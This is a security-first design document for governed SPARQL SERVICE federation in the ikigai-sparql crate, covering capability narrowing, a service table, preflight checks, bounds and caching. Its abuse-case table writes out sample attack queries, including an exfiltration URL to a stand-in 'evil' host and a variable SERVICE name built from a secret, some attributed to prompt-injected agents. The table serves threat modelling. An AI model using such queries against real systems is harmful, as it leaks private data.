# A governed `SERVICE`: SPARQL federation as kernel requests, designed security-first

A design pass, not code (ledger #2685; very-large-graphs direction, register entry 12, tier 4).
Every claim about what exists today cites the source it was read from. `$R` is the crates.io
registry checkout of each crate at the version named. "core main" is the GitHub `main` branch
of ikigai-core on 2026-10-31. **The verdict is at the end: build it, in ikigai-sparql, off by
default, once a target exists that needs it.**

## Why

ikigai-sparql refuses every `SERVICE` and every `LOAD` today, and that is right (ledger #1083,
`crates/ikigai-sparql/src/egress.rs`). oxigraph's own federated query makes its own HTTP
request. That request never goes through `urn:http:get`, so no capability is consulted. The
refusal has two layers. Layer 1 is a typed `InvalidArgument` before evaluation: `check_query`
walks the whole algebra, `EXISTS` included, through `budget::Cost`. Layer 2 is `RefuseService`,
installed as the default service handler of every evaluator the crate builds. Layer 2 is the
guarantee: a host whose graph turns on `oxigraph/http-client` (rudof_rdf does) would otherwise
get the HTTP handler back.

Federation that goes through the kernel exists already as `graph=`. Each listed source is
resolved with `inv.source` or through `urn:http:get` (`src/lib.rs`, `resolve_graph`), and
loaded whole. That breaks down for very large graphs: a river index too big to ship cannot be
a `graph=` source. What a large graph needs is to have the **pattern sent to the data**, and
`SERVICE` is SPARQL's syntax for that. oxigraph lets the host decide what `SERVICE` means. That
makes a governed form possible: `SERVICE <urn:…>` becomes an ikigai request, under the caller's
authority narrowed, resolved through the kernel (mounts included), and cached on golden threads.

## The design in one paragraph

Before evaluation, the endpoint finds every `SERVICE` in the parsed algebra. Each one must name
a **constant** IRI that matches the host's **service table**. Its inner pattern must contain no
`SERVICE` of its own. Then the endpoint **preflights** every target with a `Meta` request under
the caller's capability, narrowed. Only after every target has passed does it issue each call:
one kernel `Source` request per distinct `(target, pattern)`, carrying the inner pattern
**serialized from the parsed algebra** as `query=`, with the remaining time and size budgets.
Each answer (SPARQL results JSON) is parsed under the crate's existing bounds, and its rows are
**substituted into the algebra as a `VALUES` table** where the `SERVICE` stood. The rewritten
query is then evaluated as any query is today. `RefuseService` stays the default handler, so
nothing is ever fetched during evaluation, and no outer binding ever leaves the process.

The rest of this document gives the reasons for each part of that paragraph.

## 1. Which authority a `SERVICE` runs under

This comes first because the rest depends on it. **A `SERVICE` call runs under the capability
of the request that carried the query text, narrowed to the scopes the host's service table
keeps. It never runs under a grant, and never under the module's or the job's authority.**

- **Mechanism.** `Invocation::issue_attenuated(request, keep)` ($R/ikigai-core-0.2.10
  `src/endpoint.rs:1525`) does `self.capability.attenuate(keep)`: root narrows to exactly
  `keep`, and a scoped capability narrows to the intersection. There is no widening form, and
  core keeps the seam that chooses authority private on purpose (core main
  `docs/design/sub-request-authority.md`, "the load-bearing fact"). So the worst a mistake in
  this module can cause is a `Denied` further down.
- **Delegation is ruled out.** Part B of that core design (a module acting under authority it
  holds itself) is "designed, not built", and its verdict is "never grant a general-purpose
  evaluator". `urn:sparql:*` is exactly such an evaluator. If `SERVICE` ran under a grant,
  every caller who can write SPARQL text would get the grant.
- **What `keep` is.** It is a static list in the host's service table, one per entry (§2). It
  holds the read scopes the target needs, for example
  `urn:cap:store:read:graph:urn:iki:river:index`. It never holds `urn:cap:net:*`, because the
  table refuses those at construction (§3). When the target answers per principal, the
  endpoint adds the caller's principal scope to `keep` at call time: `attenuate` sheds a
  principal unless it is named ($R/ikigai-core-0.2.10 `src/capability.rs:387-399`;
  core main `docs/design/principal-capability.md`).
- **Stored query text gets no more authority than inline text.** A feed mapping is read by
  reference: `urn:iki:feed:mapped` passes `query=<urn:iki:feed:mapping:{source}>`
  (`crates/ikigai-feed/src/mapped.rs:212-218`). The same holds for a saved search or a
  `urn:nl:sparql` draft. Such text runs under the authority of whoever reads it, which may be
  broader than the authority of whoever wrote it. Narrowing caps the reach at the table's
  `keep`, whoever the reader is. The table also takes a second, per-entry switch,
  `inline_only`, on by default. With it on, a `SERVICE` to that entry is refused when the
  `query` argument arrived as `ArgRef::Reference` rather than `ArgRef::Inline`. A host turns it
  off only for an entry whose stored queries it trusts. ⚠ This switch is defence in depth, not
  a boundary. A caller who can read the stored text can paste it inline, and does so under
  their own authority. The switch protects a reader from text someone else wrote. It does not
  protect a target from a caller.

## 2. Which names a `SERVICE` may target

**Only names in a host-written service table. Never a variable. In the first tranche, never
`http(s):`.**

```rust
ikigai_sparql::space_with_services(ceiling, answer, ServiceTable::new([
    ServiceEntry::prefix("urn:iki:river:index:")
        .keep(["urn:cap:store:read:graph:urn:iki:river:index"]),
]))
```

- **Off by default.** `space()`, `space_with_budget`, `space_with_bounds` and the shared-store
  constructors keep today's refusal, with today's error text. Only a host that builds the space
  with a table gets `SERVICE`, and then only for the table's names. The table is written where
  the kernel is built, so a module's own `space()` helper cannot widen it. That is the same
  reason core puts grants in a kernel-construction table rather than the space algebra.
- **The rule "`urn:` names the caller could Source anyway" is not enough,** and the red-team
  finding merged into this item explains why. `urn:iki:feed:graph:{feed}` is a `urn:` name
  that fetches any URL, and a `urn:` name can be an alias or rewrite onto anything. A rule
  that accepts any Sourceable name turns every name a caller can reach into something
  attacker-chosen query text can reach. That includes prompt-injected or stored text running
  under someone else's authority, which the caller never typed. The table makes the set of
  reachable names a decision the host made, rather than whatever the query string names.
- **No prefix in the table may be a prefix of another.** This is refused at construction, for
  the reason core gives for grants: longest-match is a resolution rule, and applied to
  authority it becomes silent precedence.
- **The table is checked against the name as written. Narrowing is the backstop if a rewrite
  moves the target.** The kernel computes a canonical target only inside resolution, and an
  endpoint cannot ask for it. If an alias maps `urn:iki:river:index:x` onto a resource that
  fetches, that resource's `urn:http:get` sub-request needs `urn:cap:net:*`. The narrowed
  capability cannot hold that scope (§3), so the fetch is refused. If core later exposes a
  canonical-name probe, check the table against that instead. Until then this is a documented
  limit.
- **`SERVICE ?var` is refused, always.** A variable service name is how private data gets
  sent out in a URL: the outer query binds `?svc` from a private triple and calls it. It is
  also a per-row fan-out, because spareval resolves the name once for each incoming solution
  ($R/spareval-0.2.7 `src/eval.rs:1786-1808`). `NamedNodePattern` is either a `NamedNode` or a
  `Variable` (spargebra 0.4.7), so "constant" is one match arm. Layer 1 already sees
  `?var` (`egress.rs`, "a service named by a variable"). The new check keeps that refusal and
  says why.
- **`SERVICE SILENT` is refused in the first tranche.** `SILENT` turns a failed call into the
  identity solution, so the query continues as if the target had matched everything
  ($R/spareval-0.2.7 `src/eval.rs:1775-1779`). A silenced `Denied` or budget refusal would
  produce a plausible wrong answer. If a later tranche admits `SILENT`, it should cover only a
  failure the target reports (`Unavailable`, `Timeout`). It must never cover a refusal by this
  endpoint's preflight, table or budget.

## 3. `https:` targets

**Still refused in the first tranche. Later, only as a `urn:` name the host binds to one
fixed endpoint URL. Never as a URL written in query text.**

Routing `SERVICE <https://x/sparql>` through `urn:http:get` under `urn:cap:net:*` would be
"governed" in the narrow sense that a capability is consulted. It would still give every SPARQL
text the network reach of whoever runs it. That is the very harm #1083 closed, now with a
permission check in front of it. A caller who holds `urn:cap:net:*` and wants a remote graph
already has `graph=https://…`. That choice is made in an argument by the caller, not in text
an LLM or a mapping author wrote.

The safe form, if one is ever needed: a host binds
`urn:iki:sparql:remote:{name}` to an endpoint that sends `query=` to one URL fixed in the
host's configuration. It sends through `urn:http:get`, so the host's own `urn:cap:net:*`
applies. The host then lists that name in the service table with a `keep` naming the one net
scope. ⚠ This is the only case where `keep` may name a `urn:cap:net:` scope, and only an
exact scope, never a family. `ServiceTable::new` refuses a `urn:cap:net:` family in `keep`
outright, and accepts an exact one only on an entry built with
`ServiceEntry::remote(url, scope)`. With this shape, the text can choose among endpoints the
host listed, and the URL is never in the text.

## 4. How the inner pattern is sent

**As SPARQL text serialized from the parsed algebra, sent as `query=` to a target that
declares it answers SPARQL. Not as a named view.**

- **Serialized, not spliced.** The endpoint wraps the `GraphPattern` it parsed in
  `Query::Select { pattern, .. }` and prints it with spargebra's `Display`. The target
  therefore gets a canonical rendering of a tree that has already been parsed and bounded
  here, never a slice of the caller's string. This is the typed-argument rule from core's
  sub-request design, applied to the one argument that has to be text. The serialized query
  is checked again with `limits::check_sparql` before it is sent. Re-printing can make the
  text longer, and the target has the same parser limits as this endpoint.
- **No outer bindings are sent.** The call carries the inner pattern alone. It carries no
  `VALUES` block of outer solutions and no bind-join pushdown, which a federation engine would
  normally add to make the call selective. That is deliberate: **a bind-join sends local data
  to the remote.** The outer query's bindings can come from a private `graph=` source, and
  pushing them into the call is the same leak as `SERVICE ?var`. The cost is that an inner
  pattern must be selective by itself. A pattern that is not selective meets the row bound
  (§5) and is refused rather than truncated.
- **Why not a named view.** A named view such as `urn:iki:river:index:recent` is a resource
  the caller can already list as a `graph=` source, or reach with `bindings=` (0.3.2). Calling
  it through `SERVICE` adds syntax and nothing else. A view can also contain a `SERVICE` that
  this endpoint cannot see, which defeats the depth rule (§6). Text from the pattern keeps the
  whole call visible to the endpoint before anything is sent.
- **The target declares that it answers SPARQL.** The preflight `Meta` request (§7) must
  return a `Description` with a `query` input and `application/sparql-results+json` among its
  outputs. That is the shape `urn:sparql:select` already describes. A name that does not
  declare it (a feed lift, a file, a transreptor) is refused before anything is sent, even if
  it matches the table. A target can satisfy this by being a Rewrite onto
  `urn:sparql:select graph=<its own graph>` on the peer. That is a single line of host wiring,
  and it means the peer runs this same crate with the same refusals.

## 5. Result format and bounds

- **Format.** The call asks for `as=application/sparql-results+json`, and the answer is parsed
  with `sparesults` (already in the dependency graph through oxigraph). A result whose type is
  something else is refused, naming the target. JSON is chosen because its parser does not
  recurse on content. The one recursive structure a result can carry is an RDF 1.2 triple term
  inside a binding, and that is checked against ikigai-rdf's `MAX_TURTLE_NESTING` as each row
  is decoded.
- **Rows become `VALUES`, not a handler.** spargebra's
  `GraphPattern::Values { variables, bindings: Vec<Vec<Option<GroundTerm>>> }` takes the rows
  in place of the `Service` node. The meaning is the same: spareval joins a service's rows with
  each incoming solution (`combine_with(&from)`, $R/spareval-0.2.7 `src/eval.rs:1768-1772`),
  and a `VALUES` table is joined the same way. Two consequences:
  - The sync `ServiceHandler` trait ($R/spareval-0.2.7 `src/service.rs:65-75`, `131-142`)
    never has to wait on an async kernel request. Calling the kernel from inside evaluation
    would need a blocking bridge. That bridge is impossible on wasm32 and would hold the
    evaluation thread while a peer answers. With `VALUES`, every call finishes before
    evaluation starts.
  - Each distinct call is made **once**. spareval invokes the handler once per incoming
    solution, with the same pattern every time ($R/spareval-0.2.7 `src/eval.rs:1761-1767`).
    oxigraph's own HTTP handler would therefore make one request per left-hand row.
- **Blank nodes are refused in the first tranche.** `GroundTerm` has no blank node, and a
  blank node in a remote's result means nothing outside that result. A row that carries one
  is refused, naming the target and the variable. If a later tranche admits them, they should
  be skolemized with the target's name in the IRI, so two answers can never share a node.
- **A variable outside the pattern is refused.** A result must bind only variables the inner
  pattern has in scope. A row that binds anything else is refused, not dropped: a target that
  answers a different question is broken or lying.
- **Bounds, per call and in total.** These are the existing budgets (`src/budget.rs`), not
  new ones:
  - **Time.** The request's effective budget (`DEFAULT_BUDGET` 5 s, which `budget=` can lower)
    is one deadline that starts when the request arrives. Every call is sent `budget=` set to
    the time remaining, and the evaluation gets whatever is left after the calls. **The calls
    are made one after another, each with `issue_attenuated`.** They are not run concurrently
    with `fan_out`, for two reasons. `fan_out` carries the invocation's capability unchanged,
    and core has no attenuated `fan_out` (sub-request-authority.md, "Not added, on purpose").
    And sequential calls are what make the total size bound below exact. With at most 8 calls
    under one deadline, latency is the price, and it is a fair price for the first tranche. A
    call that is still running at the deadline is abandoned, and the query is
    refused with `Error::Timeout`.
  - **Rows and bytes.** Every call is sent `max_rows=` and `max_bytes=` set to what remains of
    the request's answer bound (`DEFAULT_MAX_ROWS` 100,000, `DEFAULT_MAX_BYTES` 16 MiB). Each
    answer's size is subtracted before the next call is sent. So the **total** of all service
    answers fits inside one answer bound, and the outer answer is bounded again as it is
    serialized. The size of the `VALUES` tables is what this endpoint keeps in memory.
    Bounding it with the answer bound keeps one query's memory at what one answer costs today.
  - **Count.** At most `MAX_SERVICE_CALLS` (8) distinct calls per query. Each `SERVICE` node
    already counts toward `MAX_ALGEBRA_NODES` and `MAX_JOIN_OPERANDS`, but those limits are set
    for planner cost, not for calls to peers.
  - **The refusal by size** stays cacheable as today (`TOO_LARGE_EXPIRY`, ledger #2681). It
    hangs on the threads the answer would have had, which now include the targets'.

## 6. Depth and cycles

**One level: an inner pattern that contains `SERVICE` is refused before anything is sent.**

- **Within one kernel**, a `SERVICE` call is a sub-request, so `Kernel::with_max_depth`
  (default 64) bounds it ($R/ikigai-core-0.2.10 `src/kernel.rs:2597-2630`).
- **Across peers nothing bounds it.** "The depth is carried on the invocation … and the wire
  has no field for it, so two peers that mount each other stay unbounded by this budget"
  (same lines). A `SERVICE` to a mounted peer whose answer issues a `SERVICE` back would loop
  until a time budget runs out on each side, and it would multiply the work at every step.
- **So the depth rule is enforced in text, where this endpoint can see it.** The pattern it
  sends contains no `SERVICE`. The target must be a SPARQL door (§4) that runs exactly that
  pattern. A peer running this crate refuses any `SERVICE` in a query it receives, by default
  or by its own table. This holds whatever the peer's configuration is, because the text it
  receives has no `SERVICE` in it.
- ⚠ **What remains is not new.** A target's own *graph* can be a composite that issues
  requests, including requests back to this kernel through a mount. That is the existing
  cross-peer cycle that core names, and it is open for every mounted name, not only through
  `SERVICE`. The fix belongs to the wire (carrying depth across a peer). This design does not
  widen it: every call costs one request, sent once, inside the caller's time budget.

## 7. The capability preflight

**Every call is checked before any call is sent, and nothing a query string can do lets it
reach a name its caller could not reach directly.**

1. **Parse and bound** (today's `limits::check_sparql` and the algebra cost). Then walk the
   algebra with the existing `Cost` walker. It is the one traversal that visits `EXISTS`, and
   its doc comment warns against a second walker. Have it collect *every* `SERVICE` rather than
   only the first (`first_service` becomes `services: Vec<(NamedNodePattern, GraphPattern,
   silent)>`).
2. **Static refusals** (`InvalidArgument` on `query`, before any request): a variable name,
   `SILENT`, a name not in the table, a nested `SERVICE`, more than `MAX_SERVICE_CALLS`, and
   (with `inline_only`) query text that arrived by reference.
3. **`Meta` preflight** under the narrowed capability, one request per distinct target. This
   confirms that the name resolves and that the target declares the SPARQL face (§4).
   ⚠ **A `Meta` that passes does not prove the `Source` will.** Core keeps its
   declared-requires floor **per verb**. A target whose `Source` declares requirements
   answers `Meta` to any capability that passes one of its declared verbs
   ($R/ikigai-core-0.2.10 `src/kernel.rs:1295-1310`). So the preflight also reads the
   requirements the returned `Description` declares for `Source` and checks the narrowed
   capability against them. Core's family-aware checker, `select::cap_satisfies`, is
   `pub(crate)` (`src/select.rs:780`). The build therefore either asks core to export it, or
   accepts exact scopes only through `Capability::allows` and refuses a family-form
   requirement as not yet preflightable. That refusal is safe because it is
   over-approximate. Any failure refuses the whole query. A `Denied` is passed up as
   `Denied`, because a different grant *would* succeed against the same state. That is the
   distinction `egress.rs` draws, and here it falls the other way. The kernel still enforces
   the floor on each `Source` call. The preflight only makes sure that a refusal happens
   before anything is sent.
4. **Only then are the calls sent.** A query with three `SERVICE`s, where the third is denied,
   sends nothing. Otherwise the first two calls would let query text create load on
   targets the query is about to be refused for.

**What the manifold may offer.** The four query doors keep the `requires` they declare today,
which is none. `SERVICE` must not add a scope to them. If it did, the doors would be offered
only to callers holding the river's read scope, and every other caller would be shut out of
plain SPARQL. Reach is bounded by construction instead: every call goes through
`issue_attenuated`, so `reach(SERVICE) ⊆ reach(caller) ∩ reach(keep)`. A manifold that lists
what a principal can reach is right without knowing that `SERVICE` exists. `describe()` adds
one sentence when the host built the space with a table ("SERVICE is answered for the host's
service names; see `urn:sparql:services`"). `urn:sparql:services` is a new `Meta`-only resource
that lists the table's prefixes and the scopes each entry needs. The host's prefixes are the
names its wiring already exposes. A host that considers them sensitive leaves the resource
unbound. The ablation test is the usual one: remove the narrowing, and a test in which a
caller holds `urn:cap:secret:read` and the table's `keep` does not must fail.

## 8. Provenance and caching

- **The answer depends on the target's thread, at no extra cost.** Every call is a kernel
  sub-request, so the kernel records its expiry and golden threads against this invocation, as
  it does for a `graph=` source (`src/lib.rs`, "`inv.source` records the source's golden
  thread"). The outer answer stays `.cacheable()`, and is cut when any target's thread is cut.
- **Mounted answers are uncacheable until immutable mounted answers are cacheable.** A mount's
  forwarder marks every peer answer `with_uncached_reason(Mounted)`, which is `Expiry::Always`
  (core main `docs/design/immutable-mounted-answers.md`, reproduced on core 0.2.10). A query
  with a `SERVICE` to a mounted name is therefore uncacheable. `urn:kernel:uncached` names
  `mounted` as the reason, and nothing in this design should get around that. When #2686
  builds pins, a call to a *digest-named* target (`urn:peer:…:b3:<hex>`) becomes cacheable
  through the kernel's own verification, with no change here. A call that carries `query=` is
  not a digest name, so a SPARQL call to a peer stays uncacheable unless the peer marks its
  answer immutable under #2686's peer-pin rules. That is right: an index answer changes as the
  index grows.
- **The cache key** is today's `(request id, capability fingerprint)`. The outer entry is
  keyed under the caller's capability. The calls are keyed under the narrowed one, which is
  derived from the caller's capability and a static table, so it cannot carry more than the
  caller's. A host that changes its table at runtime has rebound the space. That leaves stale
  entries the same way any rebind does (`ikigai-core-PENDING.md` §14 finding 7, "a rebind
  leaves the catalog stale forever", as sub-request-authority.md cites it), and the remedy is the same binding-change thread. The table is fixed when the space
  is built, so in practice a table change is a restart.
- **The trace shows each call** as the sub-request it is, with the narrowed capability in
  `TraceEvent::capability`. No new trace field is needed, because no authority switch takes
  place: the narrowed capability is a subset of the caller's, not a different principal's.
- ⚠ **Names leak, contents do not.** A composite carries its targets' threads, and threads are
  public on a `Representation`. A caller can therefore learn that the answer depended on
  `urn:iki:river:index:x`. That is core's finding 3 in sub-request-authority.md: accepted, and
  stated. The caller named the target, so this tells them nothing new.

## 9. Abuse cases

The item names the red-team personas in `claude/security/README.md` as the checklist. That
file is not in this repository, and the worker could not reach it on any `ikigai-rs` repository
through the GitHub API (contents and code search, 2026-10-31). The cases below are therefore
organised by attacker position. **Before the build is briefed, they should be checked against
the persona list.**

| who | the attack | what stops it |
| --- | --- | --- |
| A stranger at an edge door | `SERVICE` to every name they can guess, to probe or to create load | table (§2); `MAX_SERVICE_CALLS`; one deadline; the preflight sends nothing until every target passes (§7) |
| A stranger | `SERVICE` on the right of a 100,000-row join, so the call repeats per row | `VALUES` substitution: each distinct call is made once (§5) |
| A prompt-injected agent | query text carrying `SERVICE <urn:iki:feed:graph:https://evil/?d=…>` to send data out | not in the table; and if aliased in, narrowing drops `urn:cap:net:*`, so the fetch is `Denied` (§1, §2) |
| A prompt-injected agent | `BIND(IRI(CONCAT("urn:iki:river:index:", ?secret)) AS ?s) SERVICE ?s {…}` | variable names refused (§2) |
| A prompt-injected agent | private outer data pushed into the inner pattern | the inner pattern is static text, and no outer bindings are sent (§4) |
| A mapping or saved-search author | stored text that runs under a broader reader's authority | `inline_only` per entry; narrowing caps reach at `keep` for any reader (§1) |
| A lying or compromised peer | rows outside the pattern, blank nodes, deep triple terms, huge answers, slow answers | refused, not dropped (§5); nesting bound; per-call and total size bounds; deadline |
| A peer that mounts back | `SERVICE` → peer → `SERVICE` → … | the text sent contains no `SERVICE` (§6); the remaining composite cycle exists already and is not widened |
| A careless host | `keep` with `urn:cap:net:*`, or overlapping prefixes | refused at table construction (§2, §3) |
| A caller with a narrow capability | using `SERVICE` to reach a name they cannot Source | the preflight runs under the caller's capability, narrowed: `Denied` (§7) |
| Anyone | `SILENT` used to hide a denial and get a plausible wrong answer | `SILENT` refused (§2) |
| Anyone | `LOAD`, or `SERVICE` inside `urn:sparql:update` | unchanged: always refused. The table applies to the four query doors only, because an update holding remote rows is a write whose provenance no thread covers |

## Verdict

**Build it, in ikigai-sparql, off by default. Brief it when a target exists that needs it.
Until then, ship nothing.**

- **The module is ikigai-sparql, not a new crate.** The refusal it relaxes (`egress.rs`), the
  walker it extends (`budget::Cost`), the budgets it divides, and the `RefuseService` backstop
  it keeps are all there. A separate crate would need a second evaluator and a second walker,
  and the walker's doc comment names that as the failure to avoid. The change is additive: one
  constructor `space_with_services`, `ServiceTable` and `ServiceEntry`, and the
  `urn:sparql:services` resource. The default spaces behave as they do today, with today's
  error text, which keeps the tests in `tests/sparql_service_egress.rs` green unchanged.
- **Wait for a consumer.** No `urn:river:index:*` (or any other SPARQL-answering index) is
  bound anywhere in `ikigai-rs` today. A code search finds only illustrative river names in the
  tutorial. The harvester (#2683, `docs/design/feed-harvester.md`) and immutable mounted
  answers (#2686) are what would produce one. Shipping a federation door before a target
  exists means the first real use is also the first test. That is the same reason core gave
  for not building delegation.
- **The first tranche, when briefed:** constant `urn:` targets from the table only; no
  `SILENT`; no blank nodes; one level; `VALUES` substitution; `Meta` preflight; budgets divided
  as in §5. The adversarial tests to write first, as tests that fail without the change: a
  `SERVICE ?var` refusal that names the reason; a nested `SERVICE` refused with nothing sent
  (a counting stub target); a third target denied with nothing sent to the first two; the
  narrowing ablation from §7; a 1,000-row left side giving exactly one call; a lying target
  (extra variable, blank node, deep triple term, oversized answer) refused; and the probe build
  (`--features http-client-probe`) still sending nothing to the network.
- **Not in any tranche:** `https:` in query text; bind-join pushdown; delegation or grants;
  `SERVICE` in updates.

## What exists and what is new

| piece | status | source |
| --- | --- | --- |
| `SERVICE`/`LOAD` refusal, two layers | exists | `crates/ikigai-sparql/src/egress.rs` |
| one algebra walker that sees `EXISTS` | exists (first service only) | `src/budget.rs`, `Cost` |
| per-request time and answer budgets, lower-only arguments | exists | `src/budget.rs` |
| narrowing sub-requests | exists | $R/ikigai-core-0.2.10 `src/endpoint.rs:1525`, `1898` |
| depth bound in one kernel | exists; not across the wire | $R/ikigai-core-0.2.10 `src/kernel.rs:2597-2630` |
| mounted answers uncacheable | exists | core 0.2.9 (#2660) |
| cacheable pinned mounted answers | designed, not built | core main `docs/design/immutable-mounted-answers.md` (#2686) |
| attenuated `fan_out` (so the calls are sequential) | not built, on purpose | core main `docs/design/sub-request-authority.md` |
| service table, preflight, `VALUES` substitution, `urn:sparql:services` | new | this document |
| a SPARQL-answering index to target | does not exist | code search over `ikigai-rs`, 2026-10-31 |
